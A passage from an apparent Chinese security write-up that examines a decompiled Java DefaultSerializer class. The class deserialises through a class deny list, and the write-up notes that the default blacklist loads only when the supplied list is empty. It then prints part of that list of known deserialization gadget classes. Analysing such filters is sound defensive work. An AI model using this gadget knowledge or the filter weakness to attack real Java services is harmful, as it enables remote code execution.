</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>com.example.server.util</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ByteArrayInputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ByteArrayOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.InputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ObjectOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.ArrayList</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Base64</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.List</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Scanner</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/* loaded from: server-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/example/server/util/DefaultSerializer.class */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>DefaultSerializer</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>serialize</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>out</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectOutputStream</span><span class=w> </span><span class=n>objOut</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectOutputStream</span><span class=p>(</span><span class=n>out</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>objOut</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>obj</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>encode</span><span class=p>(</span><span class=n>out</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>encode</span><span class=p>(</span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>data</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>Base64</span><span class=p>.</span><span class=na>getEncoder</span><span class=p>().</span><span class=na>encodeToString</span><span class=p>(</span><span class=n>data</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>deserialize</span><span class=p>(</span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>List</span><span class=o>&lt;</span><span class=n>String</span><span class=o>&gt;</span><span class=w> </span><span class=n>denyClasses</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>denyClasses</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>denyClasses</span><span class=p>.</span><span class=na>isEmpty</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>denyClasses</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>readBlackList</span><span class=p>(</span><span class=s>&#34;security/jdk_blacklist.txt&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayInputStream</span><span class=w> </span><span class=n>in</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayInputStream</span><span class=p>(</span><span class=n>obj</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>AntObjectInputStream</span><span class=w> </span><span class=n>objIn</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>AntObjectInputStream</span><span class=p>(</span><span class=n>in</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>objIn</span><span class=p>.</span><span class=na>setDenyClasses</span><span class=p>(</span><span class=n>denyClasses</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>objIn</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>List</span><span class=o>&lt;</span><span class=n>String</span><span class=o>&gt;</span><span class=w> </span><span class=nf>readBlackList</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>blackListFile</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>List</span><span class=o>&lt;</span><span class=n>String</span><span class=o>&gt;</span><span class=w> </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ArrayList</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ClassLoader</span><span class=w> </span><span class=n>classLoader</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Thread</span><span class=p>.</span><span class=na>currentThread</span><span class=p>().</span><span class=na>getContextClassLoader</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>InputStream</span><span class=w> </span><span class=n>inputStream</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>classLoader</span><span class=p>.</span><span class=na>getResourceAsStream</span><span class=p>(</span><span class=n>blackListFile</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>inputStream</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Scanner</span><span class=w> </span><span class=n>scanner</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>scanner</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Scanner</span><span class=p>(</span><span class=n>inputStream</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>scanner</span><span class=p>.</span><span class=na>hasNextLine</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>String</span><span class=w> </span><span class=n>nextLine</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>scanner</span><span class=p>.</span><span class=na>nextLine</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>isBlank</span><span class=p>(</span><span class=n>nextLine</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>result</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>nextLine</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>scanner</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>scanner</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>scanner</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>scanner</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Throwable</span><span class=w> </span><span class=n>th</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>scanner</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>scanner</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>throw</span><span class=w> </span><span class=n>th</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>result</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>static</span><span class=w> </span><span class=kt>boolean</span><span class=w> </span><span class=nf>isBlank</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>cs</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>strLen</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cs</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=p>(</span><span class=n>strLen</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>cs</span><span class=p>.</span><span class=na>length</span><span class=p>())</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>strLen</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>Character</span><span class=p>.</span><span class=na>isWhitespace</span><span class=p>(</span><span class=n>cs</span><span class=p>.</span><span class=na>charAt</span><span class=p>(</span><span class=n>i</span><span class=p>)))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=kc>false</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>只有当传入的名单为空时，加载默认的本地黑名单 BOOT-INF/classes/security/jdk_blacklist.txt</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>bsh</span><span class=p>.</span><span class=na>Interpreter</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>bsh</span><span class=p>.</span><span class=na>XThis</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>clojure</span><span class=p>.</span><span class=na>core$constantly</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>clojure</span><span class=p>.</span><span class=na>main$eval_opt</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>mchange</span><span class=p>.</span><span class=na>v2</span><span class=p>.</span><span class=na>c3p0</span><span class=p>.</span><span class=na>JndiRefForwardingDataSource</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>mchange</span><span class=p>.</span><span class=na>v2</span><span class=p>.</span><span class=na>c3p0</span><span class=p>.</span><span class=na>WrapperConnectionPoolDataSource</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>mchange</span><span class=p>.</span><span class=na>v2</span><span class=p>.</span><span class=na>c3p0</span><span class=p>.</span><span class=na>impl</span><span class=p>.</span><span class=na>PoolBackedDataSourceBase</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>rometools</span><span class=p>.</span><span class=na>rome</span><span class=p>.</span><span class=na>feed</span><span class=p>.</span><span class=na>impl</span><span class=p>.</span><span class=na>EqualsBean</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>rometools</span><span class=p>.</span><span class=na>rome</span><span class=p>.</span><span class=na>feed</span><span class=p>.</span><span class=na>impl</span><span class=p>.</span><span class=na>ToStringBean</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>sun</span><span class=p>.</span><span class=na>jndi</span><span class=p>.</span><span class=na>ldap</span><span class=p>.</span><span class=na>LdapAttribute</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>sun</span><span class=p>.</span><span class=na>jndi</span><span class=p>.</span><span class=na>rmi</span><span class=p>.</span><span class=na>registry</span><span class=p>.</span><span class=na>BindingEnumeration</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>sun</span><span class=p>.</span><span class=na>jndi</span><span class=p>.</span><span class=na>toolkit</span><span class=p>.</span><span class=na>dir</span><span class=p>.</span><span class=na>LazySearchEnumerationImpl</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>sun</span><span class=p>.</span><span class=na>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>xalan</span><span class=p>.</span><span class=na>internal</span><span class=p>.</span><span class=na>xsltc</span><span class=p>.</span><span class=na>trax</span><span class=p>.</span><span class=na>TemplatesImpl</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>sun</span><span class=p>.</span><span class=na>rowset</span><span class=p>.</span><span class=na>JdbcRowSetImpl</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>sun</span><span class=p>.</span><span class=na>syndication</span><span class=p>.</span><span class=na>feed</span><span class=p>.</span><span class=na>impl</span><span class=p>.</span><span class=na>ObjectBean</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>sun</span><span class=p>.</span><span class=na>xml</span><span class=p>.</span><span class=na>internal</span><span class=p>.</span><span class=na>bind</span><span class=p>.</span><span class=na>v2</span><span class=p>.</span><span class=na>runtime</span><span class=p>.</span><span class=na>unmarshaller</span><span class=p>.</span><span class=na>Base64Data</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>alibaba</span><span class=p>.</span><span class=na>fastjson</span><span class=p>.</span><span class=na>JSONObject</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>alibaba</span><span class=p>.</span><span class=na>fastjson2</span><span class=p>.</span><span class=na>JSONObject</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>java</span><span class=p>.</span><span class=na>beans</span><span class=p>.</span><span class=na>EventHandler</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>Proxy</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>java</span><span class=p>.</span><span class=na>net</span><span class=p>.</span><span class=na>URL</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>java</span><span class=p>.</span><span class=na>rmi</span><span class=p>.</span><span class=na>registry</span><span class=p>.</span><span class=na>Registry</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>java</span><span class=p>.</span><span class=na>rmi</span><span class=p>.</span><span class=na>server</span><span class=p>.</span><span class=na>ObjID</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>java</span><span class=p>.</span><span class=na>rmi</span><span class=p>.</span><span class=na>server</span><span class=p>.</span><span class=na>RemoteObjectInvocationHandler</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>java</span><span class=p>.</span><span class=na>rmi</span><span class=p>.</span><span class=na>server</span><span class=p>.</span><span class=na>UnicastRemoteObject</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>java</span><span class=p>.</span><span class=na>security</span><span class=p>.</span><span class=na>SignedObject</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>Comparator</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>PriorityQueue</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>ServiceLoader$LazyIterator</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javax</span><span class=p>.</span><span class=na>imageio</span><span class=p>.</span><span class=na>ImageIO$ContainsFilter</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javax</span><span class=p>.</span><span class=na>management</span><span class=p>.</span><span class=na>BadAttributeValueExpException</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javax</span><span class=p>.</span><span class=na>management</span><span class=p>.</span><span class=na>MBeanServerInvocationHandler</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javax</span><span class=p>.</span><span class=na>management</span><span class=p>.</span><span class=na>openmbean</span><span class=p>.</span><span class=na>CompositeDataInvocationHandler</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javax</span><span class=p>.</span><span class=na>naming</span><span class=p>.</span><span class=na>InitialContext</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javax</span><span class=p>.</span><span class=na>naming</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>ObjectFactory</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javax</span><span class=p>.</span><span class=na>script</span><span class=p>.</span><span class=na>ScriptEngineManager</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>javax</span><span class=p>.</span><span class=na>xml</span><span class=p>.</span><span class=na>transform</span><span class=p>.</span><span class=na>Templates</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>net</span><span class=p>.</span><span class=na>sf</span><span class=p>.</span><span class=na>json</span><span class=p>.</span><span class=na>JSONObject</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>beanutils</span><span class=p>.</span><span class=na>BeanComparator</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>collections</span><span class=p>.</span><span class=na>Transformer</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>collections</span><span class=p>.</span><span class=na>functors</span><span class=p>.</span><span class=na>ChainedTransformer</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>collections</span><span class=p>.</span><span class=na>functors</span><span class=p>.</span><span class=na>ConstantTransformer</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>collections</span><span class=p>.</span><span class=na>functors</span><span class=p>.</span><span class=na>InstantiateTransformer</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>collections</span><span class=p>.</span><span class=na>functors</span><span class=p>.</span><span class=na>InvokerTransformer</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>collections4</span><span class=p>.</span><span class=na>comparators</span><span class=p>.</span><span class=na>TransformingComparator</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>collections4</span><span class=p>.</span><span class=na>functors</span><span class=p>.</span><span class=na>ChainedTransformer</span><span class=w>  
